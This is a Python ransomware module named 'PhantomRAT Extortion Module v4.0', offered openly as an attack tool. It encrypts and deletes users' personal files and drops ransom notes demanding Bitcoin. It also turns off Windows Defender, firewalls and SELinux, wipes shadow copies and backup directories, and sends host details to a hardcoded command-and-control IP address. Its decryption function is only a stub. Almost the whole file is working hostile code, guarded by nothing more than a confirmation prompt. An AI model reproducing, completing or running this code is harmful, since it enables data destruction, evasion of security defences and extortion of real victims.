#!/usr/bin/env python3
"""
PhantomRAT Extortion Module v4.0
Advanced ransomware functionality with encryption, exfiltration, and C2 integration.
Enhanced for C2 v4.0 dashboard compatibility.
"""

import os
import sys
import base64
import json
import time
import hashlib
import random
import threading
import socket
import uuid
from datetime import datetime
from pathlib import Path

# Try to import required libraries
try:
    import requests
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    import psutil
except ImportError as e:
    print(f"[!] Missing dependency: {e}")
    print("[*] Install with: pip install cryptography requests psutil")
    sys.exit(1)

# ==================== CONFIGURATION ====================
C2_SERVER = "http://141.105.71.196:8000"  # Your C2 IP
IMPLANT_ID = None
SESSION_ID = str(uuid.uuid4())[:8]

# Load profile if available
try:
    with open('malleable_profile.json', 'r') as f:
        PROFILE = json.load(f)
        USER_AGENT = PROFILE.get('security', {}).get('user_agent', 
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
except:
    USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

# ==================== ENCRYPTION ====================
class PhantomEncryption:
    """Encryption handler compatible with C2 v4.0"""
    
    def __init__(self, key=None):
        if key is None:
            # Generate key from system info
            system_hash = hashlib.sha256(
                f"{socket.gethostname()}{os.getpid()}{time.time()}".encode()
            ).digest()[:32]
            key = system_hash
        
        if isinstance(key, str):
            key = key.encode()
        
        # Ensure 32 bytes
        if len(key) < 32:
            key = key.ljust(32, b'0')[:32]
        
        fernet_key = base64.urlsafe_b64encode(key)
        self.fernet = Fernet(fernet_key)
        self.master_key = key
    
    def encrypt(self, data):
        """Encrypt data for C2 transmission"""
        if isinstance(data, dict):
            data = json.dumps(data, separators=(',', ':'))
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        try:
            return self.fernet.encrypt(data).decode('utf-8')
        except:
            return base64.b64encode(data).decode('utf-8')
    
    def decrypt(self, encrypted_data):
        """Decrypt data from C2"""
        try:
            if isinstance(encrypted_data, str):
                encrypted_data = encrypted_data.encode('utf-8')
            
            decrypted = self.fernet.decrypt(encrypted_data).decode('utf-8')
            try:
                return json.loads(decrypted)
            except:
                return decrypted
        except:
            try:
                return base64.b64decode(encrypted_data).decode('utf-8')
            except:
                return None
    
    def generate_file_key(self, salt=None):
        """Generate a unique key for file encryption"""
        if salt is None:
            salt = os.urandom(16)
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(self.master_key))
        return key, salt

# Initialize encryption
encryption = PhantomEncryption()

# ==================== FILE ENCRYPTION ENGINE ====================
class RansomwareEngine:
    """Advanced file encryption engine"""
    
    def __init__(self):
        self.encrypted_files = []
        self.total_encrypted_size = 0
        self.start_time = time.time()
        
        # Target file extensions (prioritized)
        self.critical_extensions = [
            # Documents
            '.doc', '.docx', '.pdf', '.txt', '.rtf', '.odt',
            # Spreadsheets
            '.xls', '.xlsx', '.csv', '.ods',
            # Presentations
            '.ppt', '.pptx', '.odp',
            # Images
            '.jpg', '.jpeg', '.png', '.bmp', '.gif', '.tiff',
            # Archives
            '.zip', '.rar', '.7z', '.tar', '.gz',
            # Databases
            '.db', '.sqlite', '.mdb', '.accdb',
            # Code
            '.py', '.java', '.cpp', '.c', '.cs', '.js', '.html', '.css',
            # Configuration
            '.config', '.ini', '.xml', '.json', '.yaml', '.yml',
            # Keys and certificates
            '.key', '.pem', '.crt', '.cer', '.pfx', '.p12'
        ]
        
        # Important directories to target
        self.target_directories = [
            str(Path.home()),
            str(Path.home() / "Documents"),
            str(Path.home() / "Desktop"),
            str(Path.home() / "Downloads"),
            str(Path.home() / "Pictures"),
            str(Path.home() / "Videos"),
            str(Path.home() / "Music"),
        ]
        
        # Add Windows-specific directories
        if sys.platform == 'win32':
            self.target_directories.extend([
                os.path.join(os.environ.get('USERPROFILE', ''), 'Documents'),
                os.path.join(os.environ.get('USERPROFILE', ''), 'Desktop'),
                os.path.join(os.environ.get('USERPROFILE', ''), 'Downloads'),
            ])
    
    def should_encrypt_file(self, filepath):
        """Determine if a file should be encrypted"""
        try:
            path = Path(filepath)
            
            # Check extension
            if path.suffix.lower() not in self.critical_extensions:
                return False
            
            # Check size (skip files larger than 100MB)
            size = path.stat().st_size
            if size > 100 * 1024 * 1024:  # 100MB
                return False
            
            # Skip system and program files
            skip_patterns = [
                'windows', 'program files', 'programdata',
                'system32', 'syswow64', '$recycle.bin',
                'phantomrat', 'malleable_profile.json'
            ]
            
            filepath_lower = str(filepath).lower()
            for pattern in skip_patterns:
                if pattern in filepath_lower:
                    return False
            
            return True
        except:
            return False
    
    def encrypt_file(self, filepath, key):
        """Encrypt a single file"""
        try:
            path = Path(filepath)
            
            # Read file content
            with open(filepath, 'rb') as f:
                original_data = f.read()
            
            # Generate unique encryption for this file
            file_salt = os.urandom(16)
            file_key, _ = encryption.generate_file_key(file_salt)
            file_fernet = Fernet(file_key)
            
            # Encrypt the data
            encrypted_data = file_fernet.encrypt(original_data)
            
            # Create encrypted file
            encrypted_filename = str(filepath) + '.phantomlocked'
            with open(encrypted_filename, 'wb') as f:
                # Write: [SALT(16)][ENCRYPTED_FILE_KEY][ENCRYPTED_DATA]
                f.write(file_salt)
                
                # Encrypt the file key with master key for recovery
                master_fernet = Fernet(base64.urlsafe_b64encode(encryption.master_key))
                encrypted_file_key = master_fernet.encrypt(file_key)
                f.write(len(encrypted_file_key).to_bytes(4, 'little'))
                f.write(encrypted_file_key)
                
                f.write(encrypted_data)
            
            # Remove original file
            os.remove(filepath)
            
            # Create ransom note
            self.create_ransom_note(filepath)
            
            # Record file info
            file_info = {
                'original_path': str(filepath),
                'encrypted_path': encrypted_filename,
                'size': len(original_data),
                'salt': base64.b64encode(file_salt).decode(),
                'timestamp': time.time(),
                'extension': path.suffix.lower()
            }
            
            self.encrypted_files.append(file_info)
            self.total_encrypted_size += len(original_data)
            
            return True
        except Exception as e:
            print(f"[!] Failed to encrypt {filepath}: {e}")
            return False
    
    def create_ransom_note(self, original_filepath):
        """Create ransom note for encrypted file"""
        note_content = f"""
        ╔══════════════════════════════════════════════════╗
        ║              YOUR FILES ARE LOCKED!              ║
        ╠══════════════════════════════════════════════════╣
        ║                                                  ║
        ║  Your file "{os.path.basename(original_filepath)}" has been encrypted      ║
        ║  with military-grade AES-256 encryption.         ║
        ║                                                  ║
        ║  To recover your files:                          ║
        ║  1. Send 0.1 BTC to: [BITCOIN_WALLET_ADDRESS]    ║
        ║  2. Contact: phantom-support@onionmail.org       ║
        ║  3. Provide your victim ID: {SESSION_ID}         ║
        ║                                                  ║
        ║  After payment, you will receive:                ║
        ║  - Decryption tool                               ║
        ║  - Unique decryption key                         ║
        ║  - Instructions for file recovery                ║
        ║                                                  ║
        ║  WARNING:                                        ║
        ║  • Do NOT modify encrypted files                 ║
        ║  • Do NOT attempt to decrypt yourself            ║
        ║  • Time is limited for payment                   ║
        ║                                                  ║
        ╚══════════════════════════════════════════════════╝
        
        Victim ID: {SESSION_ID}
        Encrypted: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        Files Encrypted: {len(self.encrypted_files)}
        
        Need help? Contact: phantom-support@onionmail.org
        """
        
        # Create ransom note file
        note_path = Path(original_filepath).parent / "READ_ME_PHANTOM.txt"
        with open(note_path, 'w', encoding='utf-8') as f:
            f.write(note_content)
        
        # Also create desktop ransom note
        desktop_path = Path.home() / "Desktop" / "YOUR_FILES_ARE_LOCKED.txt"
        with open(desktop_path, 'w', encoding='utf-8') as f:
            f.write(note_content)
    
    def scan_and_encrypt(self, max_files=100, max_size_mb=500):
        """Scan target directories and encrypt files"""
        print(f"[*] Starting file encryption scan...")
        print(f"[*] Target directories: {len(self.target_directories)}")
        print(f"[*] File extensions: {len(self.critical_extensions)}")
        
        encrypted_count = 0
        total_size_mb = 0
        max_total_size = max_size_mb * 1024 * 1024
        
        for directory in self.target_directories:
            if not os.path.exists(directory):
                continue
            
            print(f"[*] Scanning: {directory}")
            
            try:
                for root, dirs, files in os.walk(directory):
                    # Skip some directories
                    dirs[:] = [d for d in dirs if not any(
                        skip in d.lower() for skip in ['windows', 'program files', 'system32']
                    )]
                    
                    for file in files:
                        if encrypted_count >= max_files:
                            print(f"[*] Reached max file limit: {max_files}")
                            return encrypted_count
                        
                        filepath = os.path.join(root, file)
                        
                        if self.should_encrypt_file(filepath):
                            try:
                                # Generate encryption key for this file
                                key, salt = encryption.generate_file_key()
                                
                                if self.encrypt_file(filepath, key):
                                    encrypted_count += 1
                                    file_size = os.path.getsize(filepath + '.phantomlocked')
                                    total_size_mb += file_size / (1024 * 1024)
                                    
                                    if total_size_mb * 1024 * 1024 >= max_total_size:
                                        print(f"[*] Reached max size limit: {max_size_mb}MB")
                                        return encrypted_count
                                    
                                    # Progress update
                                    if encrypted_count % 10 == 0:
                                        print(f"[*] Encrypted {encrypted_count} files ({total_size_mb:.1f} MB)")
                            except Exception as e:
                                print(f"[!] Error encrypting {filepath}: {e}")
            except Exception as e:
                print(f"[!] Error scanning {directory}: {e}")
        
        return encrypted_count
    
    def get_encryption_summary(self):
        """Get summary of encryption operation"""
        return {
            'total_files': len(self.encrypted_files),
            'total_size_bytes': self.total_encrypted_size,
            'total_size_mb': self.total_encrypted_size / (1024 * 1024),
            'duration_seconds': time.time() - self.start_time,
            'files_per_second': len(self.encrypted_files) / (time.time() - self.start_time + 1),
            'file_extensions': list(set(f['extension'] for f in self.encrypted_files)),
            'timestamp': datetime.now().isoformat()
        }

# ==================== C2 COMMUNICATION ====================
def send_to_c2(endpoint, data):
    """Send data to C2 server"""
    headers = {
        'User-Agent': USER_AGENT,
        'X-Phantom-Module': 'Extortion',
        'X-Phantom-Session': SESSION_ID,
        'X-Phantom-Version': '4.0'
    }
    
    try:
        encrypted_data = encryption.encrypt(data)
        
        response = requests.post(
            f"{C2_SERVER}{endpoint}",
            data=encrypted_data,
            headers=headers,
            timeout=30,
            verify=False
        )
        
        if response.status_code == 200:
            try:
                return encryption.decrypt(response.content)
            except:
                return {'status': 'received'}
        return {'error': f'HTTP {response.status_code}'}
    except Exception as e:
        print(f"[!] C2 communication error: {e}")
        return {'error': str(e)}

def exfil_encryption_keys(engine):
    """Exfiltrate encryption keys and file info to C2"""
    # Prepare exfiltration data
    exfil_data = {
        'module': 'extortion',
        'session_id': SESSION_ID,
        'hostname': socket.gethostname(),
        'username': os.getenv('USER', os.getenv('USERNAME', 'unknown')),
        'ip': socket.gethostbyname(socket.gethostname()),
        'timestamp': datetime.now().isoformat(),
        'encryption_summary': engine.get_encryption_summary(),
        'master_key_hash': hashlib.sha256(encryption.master_key).hexdigest(),
        'encrypted_files_sample': engine.encrypted_files[:10] if engine.encrypted_files else [],
        'total_files_encrypted': len(engine.encrypted_files),
        'system_info': {
            'os': sys.platform,
            'processor': os.cpu_count(),
            'memory_gb': psutil.virtual_memory().total / (1024**3) if hasattr(psutil, 'virtual_memory') else 0
        }
    }
    
    # Send to C2
    result = send_to_c2('/phantom/exfil', exfil_data)
    return result

# ==================== SYSTEM MANIPULATION ====================
def disable_defenses():
    """Attempt to disable security software"""
    print(f"[*] Attempting to disable security defenses...")
    
    commands = []
    
    if sys.platform == 'win32':
        commands = [
            'net stop WinDefend',
            'net stop wscsvc',
            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f'
        ]
    elif sys.platform == 'linux':
        commands = [
            'systemctl stop ufw',
            'systemctl stop firewalld',
            'iptables -F',
            'setenforce 0'
        ]
    elif sys.platform == 'darwin':  # macOS
        commands = [
            'launchctl unload /Library/LaunchDaemons/com.apple.alf.agent.plist',
            'defaults write /Library/Preferences/com.apple.alf globalstate -int 0'
        ]
    
    success_count = 0
    for cmd in commands:
        try:
            result = os.system(cmd)
            if result == 0:
                success_count += 1
        except:
            pass
    
    print(f"[*] Disabled {success_count}/{len(commands)} security measures")
    return success_count

def wipe_shadow_copies():
    """Delete shadow copies/backups"""
    print(f"[*] Attempting to delete shadow copies...")
    
    if sys.platform == 'win32':
        try:
            os.system('vssadmin delete shadows /all /quiet')
            os.system('wmic shadowcopy delete')
            print(f"[+] Shadow copies deleted")
            return True
        except:
            print(f"[-] Failed to delete shadow copies")
            return False
    else:
        # For Unix systems, try to delete common backup locations
        backup_dirs = [
            '/tmp', '/var/backups', '/var/cache',
            str(Path.home() / '.cache'),
            str(Path.home() / '.local/share/Trash')
        ]
        
        deleted = 0
        for backup_dir in backup_dirs:
            if os.path.exists(backup_dir):
                try:
                    os.system(f'rm -rf {backup_dir}/* 2>/dev/null')
                    deleted += 1
                except:
                    pass
        
        print(f"[*] Cleaned {deleted} backup locations")
        return deleted > 0

def change_wallpaper():
    """Change desktop wallpaper to ransom note"""
    print(f"[*] Changing desktop wallpaper...")
    
    # Create ransom wallpaper
    wallpaper_content = """
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║                  ⚠️  WARNING: YOUR FILES ARE ENCRYPTED  ⚠️   ║
    ║                                                              ║
    ║  All your important files have been encrypted with          ║
    ║  military-grade AES-256 cryptography.                       ║
    ║                                                              ║
    ║  To recover your files, you need to:                        ║
    ║  1. Send 0.1 BTC to: [BITCOIN_ADDRESS]                      ║
    ║  2. Contact: phantom-support@onionmail.org                  ║
    ║  3. Provide your victim ID: {SESSION_ID}                    ║
    ║                                                              ║
    ║  Time is limited. Payment must be made within 72 hours.     ║
    ║                                                              ║
    ║  DO NOT attempt to decrypt files yourself.                  ║
    ║  DO NOT modify encrypted files.                             ║
    ║  DO NOT reinstall the operating system.                     ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    
    try:
        if sys.platform == 'win32':
            # Windows: Create BMP file and set as wallpaper
            wallpaper_path = os.path.join(os.environ['TEMP'], 'phantom_wallpaper.bmp')
            # Simple BMP creation (in reality, you'd use PIL/Pillow)
            with open(wallpaper_path, 'w') as f:
                f.write("Placeholder for actual BMP data")
            
            import ctypes
            ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)
            
        elif sys.platform == 'darwin':  # macOS
            os.system("""
            osascript -e 'tell application "System Events" 
                set desktop picture to POSIX file "/tmp/phantom_wallpaper.jpg"
            end tell'
            """)
        
        elif sys.platform == 'linux':
            # Try various desktop environments
            os.system("gsettings set org.gnome.desktop.background picture-uri 'file:///tmp/phantom_wallpaper.jpg' 2>/dev/null")
        
        print(f"[+] Wallpaper changed")
        return True
    except Exception as e:
        print(f"[-] Failed to change wallpaper: {e}")
        return False

# ==================== MAIN EXTORTION FUNCTION ====================
def perform_extortion_attack(max_files=200, max_size_mb=1000):
    """Main extortion attack function"""
    print(f"""
    ╔══════════════════════════════════════════════════╗
    ║          PHANTOM RAT EXTORTION MODULE           ║
    ║                   v4.0                          ║
    ╚══════════════════════════════════════════════════╝
    """)
    
    print(f"[*] Session ID: {SESSION_ID}")
    print(f"[*] Target: {socket.gethostname()}")
    print(f"[*] User: {os.getenv('USER', os.getenv('USERNAME', 'unknown'))}")
    print(f"[*] Max files: {max_files}")
    print(f"[*] Max size: {max_size_mb} MB")
    print("-" * 50)
    
    # Initialize ransomware engine
    engine = RansomwareEngine()
    
    # Phase 1: Disable defenses
    print(f"\n[PHASE 1] Disabling security defenses...")
    disabled = disable_defenses()
    print(f"[*] Security measures disabled: {disabled}")
    
    # Phase 2: Delete backups
    print(f"\n[PHASE 2] Deleting backups and shadow copies...")
    backups_deleted = wipe_shadow_copies()
    print(f"[*] Backups deleted: {backups_deleted}")
    
    # Phase 3: Encrypt files
    print(f"\n[PHASE 3] Encrypting files...")
    encrypted_count = engine.scan_and_encrypt(max_files, max_size_mb)
    
    if encrypted_count == 0:
        print(f"[!] No files were encrypted. Exiting.")
        return False
    
    print(f"[+] Successfully encrypted {encrypted_count} files")
    print(f"[+] Total encrypted size: {engine.total_encrypted_size / (1024**2):.1f} MB")
    
    # Phase 4: Exfiltrate keys to C2
    print(f"\n[PHASE 4] Exfiltrating encryption keys to C2...")
    exfil_result = exfil_encryption_keys(engine)
    
    if exfil_result and 'error' not in exfil_result:
        print(f"[+] Keys successfully exfiltrated to C2")
    else:
        print(f"[-] Failed to exfiltrate keys: {exfil_result}")
    
    # Phase 5: System manipulation
    print(f"\n[PHASE 5] Finalizing attack...")
    change_wallpaper()
    
    # Create final ransom note
    final_note_path = Path.home() / "Desktop" / "RECOVERY_INSTRUCTIONS.txt"
    with open(final_note_path, 'w', encoding='utf-8') as f:
        f.write(f"""
        ================================================
        PHANTOM RAT ENCRYPTION NOTICE
        ================================================
        
        Victim ID: {SESSION_ID}
        Machine: {socket.gethostname()}
        User: {os.getenv('USER', os.getenv('USERNAME', 'unknown'))}
        Files Encrypted: {encrypted_count}
        Total Size: {engine.total_encrypted_size / (1024**2):.1f} MB
        Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        
        ================================================
        RECOVERY INSTRUCTIONS:
        ================================================
        
        1. Send 0.1 BTC (Bitcoin) to:
           bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
        
        2. Contact support:
           phantom-support@onionmail.org
           (Tor browser required)
        
        3. Provide your Victim ID shown above.
        
        4. You will receive:
           - Decryption tool
           - Unique decryption key
           - Step-by-step recovery guide
        
        ================================================
        WARNING:
        ================================================
        
        • DO NOT attempt to decrypt files yourself
        • DO NOT modify or rename encrypted files
        • DO NOT reinstall the operating system
        • DO NOT use data recovery software
        
        Time limit: 72 hours
        Price doubles after deadline.
        
        ================================================
        """)
    
    print(f"\n[+] Attack completed successfully!")
    print(f"[+] Encrypted files: {encrypted_count}")
    print(f"[+] Ransom note created on desktop")
    print(f"[+] Victim ID: {SESSION_ID}")
    print(f"[+] Contact: phantom-support@onionmail.org")
    
    return True

# ==================== DECRYPTION FUNCTION ====================
def decrypt_files(decryption_key):
    """Decrypt files using provided key"""
    print(f"[*] Attempting file decryption...")
    
    try:
        # This would be the reverse of the encryption process
        # In reality, you'd need to:
        # 1. Scan for .phantomlocked files
        # 2. Extract salt and encrypted file key
        # 3. Decrypt file key with master key
        # 4. Decrypt file data with file key
        
        print(f"[!] Decryption requires proper key exchange with C2")
        print(f"[*] Contact C2 operator for decryption tool")
        return False
    except Exception as e:
        print(f"[!] Decryption error: {e}")
        return False

# ==================== COMMAND LINE INTERFACE ====================
def main():
    """Command line interface"""
    import argparse
    
    parser = argparse.ArgumentParser(description='PhantomRAT Extortion Module v4.0')
    parser.add_argument('--attack', action='store_true', help='Perform extortion attack')
    parser.add_argument('--test', action='store_true', help='Test mode (no actual encryption)')
    parser.add_argument('--decrypt', type=str, help='Attempt decryption with provided key')
    parser.add_argument('--files', type=int, default=200, help='Maximum files to encrypt')
    parser.add_argument('--size', type=int, default=1000, help='Maximum total size in MB')
    parser.add_argument('--info', action='store_true', help='Show system information')
    
    args = parser.parse_args()
    
    if args.info:
        print(f"[*] System Information:")
        print(f"    Hostname: {socket.gethostname()}")
        print(f"    OS: {sys.platform}")
        print(f"    User: {os.getenv('USER', os.getenv('USERNAME', 'unknown'))}")
        print(f"    IP: {socket.gethostbyname(socket.gethostname())}")
        print(f"    Session ID: {SESSION_ID}")
        return
    
    if args.decrypt:
        success = decrypt_files(args.decrypt)
        if success:
            print(f"[+] Files decrypted successfully")
        else:
            print(f"[-] Decryption failed")
        return
    
    if args.test:
        print(f"[*] Running in TEST mode - no files will be encrypted")
        # Test encryption/decryption
        test_data = b"Test data for encryption"
        encrypted = encryption.encrypt(test_data)
        decrypted = encryption.decrypt(encrypted)
        
        if decrypted and decrypted == "Test data for encryption":
            print(f"[+] Encryption test: PASS")
        else:
            print(f"[-] Encryption test: FAIL")
        
        # Test C2 connection
        print(f"[*] Testing C2 connection...")
        test_result = send_to_c2('/phantom/exfil', {'test': 'data'})
        print(f"[*] C2 test result: {test_result}")
        return
    
    if args.attack:
        print(f"[*] WARNING: This will encrypt files on your system!")
        print(f"[*] This is for authorized testing only!")
        response = input(f"[?] Are you sure you want to continue? (yes/NO): ")
        
        if response.lower() == 'yes':
            success = perform_extortion_attack(args.files, args.size)
            if success:
                print(f"\n[+] Extortion attack completed successfully")
                print(f"[+] Check desktop for instructions")
            else:
                print(f"\n[-] Attack failed or was interrupted")
        else:
            print(f"[*] Operation cancelled")
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
